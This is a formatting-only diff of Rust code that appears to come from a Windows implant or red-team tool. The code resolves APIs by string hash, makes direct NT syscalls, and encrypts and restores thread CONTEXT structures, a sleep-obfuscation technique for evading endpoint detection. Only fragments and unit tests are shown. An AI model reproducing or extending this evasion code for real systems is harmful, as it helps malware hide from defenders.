@@ -310,22 +310,22 @@ pub unsafe fn capture_and_encrypt_thread_contexts(
         pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0"),
     ) {
         Some(a) => std::mem::transmute(a),
-        None => return Err(anyhow!("thread_ctx: CreateToolhelp32Snapshot resolve failed")),
+        None => {
+            return Err(anyhow!(
+                "thread_ctx: CreateToolhelp32Snapshot resolve failed"
+            ))
+        }
     };
-    let thread32_first: Thread32FirstFn = match pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"Thread32First\0"),
-    ) {
-        Some(a) => std::mem::transmute(a),
-        None => return Err(anyhow!("thread_ctx: Thread32First resolve failed")),
-    };
-    let thread32_next: Thread32NextFn = match pe_resolve::get_proc_address_by_hash(
-        k32,
-        pe_resolve::hash_str(b"Thread32Next\0"),
-    ) {
-        Some(a) => std::mem::transmute(a),
-        None => return Err(anyhow!("thread_ctx: Thread32Next resolve failed")),
-    };
+    let thread32_first: Thread32FirstFn =
+        match pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"Thread32First\0")) {
+            Some(a) => std::mem::transmute(a),
+            None => return Err(anyhow!("thread_ctx: Thread32First resolve failed")),
+        };
+    let thread32_next: Thread32NextFn =
+        match pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"Thread32Next\0")) {
+            Some(a) => std::mem::transmute(a),
+            None => return Err(anyhow!("thread_ctx: Thread32Next resolve failed")),
+        };
     let get_pid: GetPidFn = match pe_resolve::get_proc_address_by_hash(
         k32,
         pe_resolve::hash_str(b"GetCurrentProcessId\0"),
@@ -401,11 +401,7 @@ pub unsafe fn capture_and_encrypt_thread_contexts(
                     // AAD: thread ID to bind the ciphertext to this thread.
                     let aad = entry.thread_id.to_le_bytes();
 
-                    let tag = match cipher.encrypt_in_place_detached(
-                        xnonce,
-                        &aad,
-                        &mut encrypted,
-                    ) {
+                    let tag = match cipher.encrypt_in_place_detached(xnonce, &aad, &mut encrypted) {
                         Ok(tag) => tag,
                         Err(_) => {
                             tracing::warn!(
@@ -414,8 +410,8 @@ pub unsafe fn capture_and_encrypt_thread_contexts(
                             );
                             // Resume the thread and continue.
                             let mut resume_count: u32 = 0;
-                            let _ = resolve_nt_resume_thread()
-                                .map(|f| f(handle, &mut resume_count));
+                            let _ =
+                                resolve_nt_resume_thread().map(|f| f(handle, &mut resume_count));
                             let _ = crate::syscalls::syscall_NtClose(handle as u64);
                             if thread32_next(snapshot, &mut entry) == 0 {
                                 break;
@@ -562,24 +558,20 @@ pub unsafe fn decrypt_and_restore_thread_contexts(
             let tag = chacha20poly1305::Tag::from_slice(&snap.context_tag);
 
             // Decrypt in-place.
-            let decrypt_result = cipher.decrypt_in_place_detached(
-                xnonce,
-                &aad,
-                &mut snap.encrypted_context,
-                tag,
-            );
+            let decrypt_result =
+                cipher.decrypt_in_place_detached(xnonce, &aad, &mut snap.encrypted_context, tag);
 
             match decrypt_result {
                 Ok(()) => {
                     // Decrypt succeeded — encrypted_context now holds plaintext CONTEXT.
-                    let ctx_ptr = snap.encrypted_context.as_ptr() as *const crate::win_types::CONTEXT;
+                    let ctx_ptr =
+                        snap.encrypted_context.as_ptr() as *const crate::win_types::CONTEXT;
 
                     // Validate that we can safely read the context.
                     if snap.encrypted_context.len() >= CONTEXT_SIZE {
                         // Set the context back on the thread.
                         // We need a mutable copy because NtSetContextThread takes *mut.
-                        let mut ctx: crate::win_types::CONTEXT =
-                            std::ptr::read(ctx_ptr);
+                        let mut ctx: crate::win_types::CONTEXT = std::ptr::read(ctx_ptr);
                         ctx.context_flags = CONTEXT_FULL;
 
                         let status = nt_set_ctx(snap.handle, &mut ctx);
@@ -669,8 +661,7 @@ mod tests {
     fn context_size_is_928_bytes() {
         // The Windows x86_64 CONTEXT struct is exactly 928 bytes.
         assert_eq!(
-            CONTEXT_SIZE,
-            928,
+            CONTEXT_SIZE, 928,
             "CONTEXT struct must be 928 bytes on Windows x86_64"
         );
     }
@@ -700,7 +691,10 @@ mod tests {
         let parent_b = [0x02u8; 32];
         let key_a = derive_thread_ctx_key(&parent_a);
         let key_b = derive_thread_ctx_key(&parent_b);
-        assert_ne!(key_a, key_b, "different parents must produce different keys");
+        assert_ne!(
+            key_a, key_b,
+            "different parents must produce different keys"
+        );
     }
 
     #[test]
